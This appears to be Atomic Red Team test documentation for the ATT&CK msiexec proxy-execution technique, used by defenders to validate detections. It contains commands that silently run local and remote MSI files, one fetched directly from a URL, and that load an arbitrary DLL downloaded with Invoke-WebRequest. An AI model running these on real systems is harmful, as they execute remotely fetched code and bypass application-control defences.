# T1218.007 - Msiexec
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1218.007)
<blockquote>Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.</blockquote>

## Atomic Tests

- [Atomic Test #1 - Msiexec.exe - Execute Local MSI file](#atomic-test-1---msiexecexe---execute-local-msi-file)

- [Atomic Test #2 - Msiexec.exe - Execute Remote MSI file](#atomic-test-2---msiexecexe---execute-remote-msi-file)

- [Atomic Test #3 - Msiexec.exe - Execute Arbitrary DLL](#atomic-test-3---msiexecexe---execute-arbitrary-dll)


<br/>

## Atomic Test #1 - Msiexec.exe - Execute Local MSI file
Execute arbitrary MSI file. Commonly seen in application installation. The MSI opens notepad.exe when sucessfully executed.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| msi_payload | MSI file to execute | Path | PathToAtomicsFolder&#92;T1218.007&#92;src&#92;Win32&#92;T1218.msi|


#### Attack Commands: Run with `command_prompt`! 


```cmd
msiexec.exe /q /i "#{msi_payload}"
```




#### Dependencies:  Run with `powershell`!
##### Description: T1218.msi must exist on disk at specified location (#{msi_payload})
##### Check Prereq Commands:
```powershell
if (Test-Path #{msi_payload}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
Write-Host "You must provide your own MSI"
```

<br/>

## Atomic Test #2 - Msiexec.exe - Execute Remote MSI file
Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI opens notepad.exe when sucessfully executed.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| msi_payload | MSI file to execute | String | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi|


#### Attack Commands: Run with `command_prompt`! 


```cmd
msiexec.exe /q /i "#{msi_payload}"
```






<br/>
<br/>

## Atomic Test #3 - Msiexec.exe - Execute Arbitrary DLL
Execute arbitrary DLL file stored locally. Commonly seen in application installation.
Upon execution, a window titled "Boom!" will open that says "Locked and Loaded!". For 32 bit systems change the dll_payload argument to the Win32 folder.
By default, if the src folder is not in place, it will download the 64 bit version.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| dll_payload | DLL to execute | Path | PathToAtomicsFolder&#92;T1218.007&#92;src&#92;x64&#92;T1218.dll|


#### Attack Commands: Run with `command_prompt`! 


```cmd
msiexec.exe /y "#{dll_payload}"
```




#### Dependencies:  Run with `powershell`!
##### Description: T1218.dll must exist on disk at specified location (#{dll_payload})
##### Check Prereq Commands:
```powershell
if (Test-Path #{dll_payload}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll" -OutFile "#{dll_payload}"
```
